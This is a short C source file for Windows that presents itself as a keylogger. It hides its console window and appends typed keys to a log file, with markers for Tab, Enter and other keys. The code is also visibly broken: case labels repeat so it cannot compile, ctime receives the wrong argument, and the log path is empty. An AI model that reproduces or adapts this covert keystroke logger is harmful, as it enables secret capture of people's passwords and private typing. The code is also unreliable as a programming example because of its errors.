#include<stdio.h>
#include<conio.h>
#include<windows.h>
#include<time.h>

#define PATH ""

int main(){
	char capture;
	FILE *file;

	time_t t;
	t=time(NULL);
	HWND window;
	window=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(window,0);

	file=fopen(PATH,"a+");
	fprintf(file,"\n#$Logger: Written by Kyohei Oka.Start Logging @%s",ctime(&time));
	while(1){
		sleep(20);
		if(kbhit()){
			capture=getch();
			switch((int)capture){
				case ' '://Space Key
					fprintf(file," ");
					break;
				case 0x09: //Tab Key
					fprintf(file,"[TAB]");
					break;
				case 0x0D: //Enter Key
					fprintf(file,"[ENTER]");
					break;
				case 0x09: //Escape Key
					fprintf(file,"[ESC]");
					break;
				case 0x09: //Backspace Key
					fprintf(file,"[BACKSPACE]");
					break;
				default:
					//Put any other inputed key into the file.
					fputc(capture,file);
			}

		if((int)capture==27){
			fclose(file);
			return 0;
			}
		}
	}
}
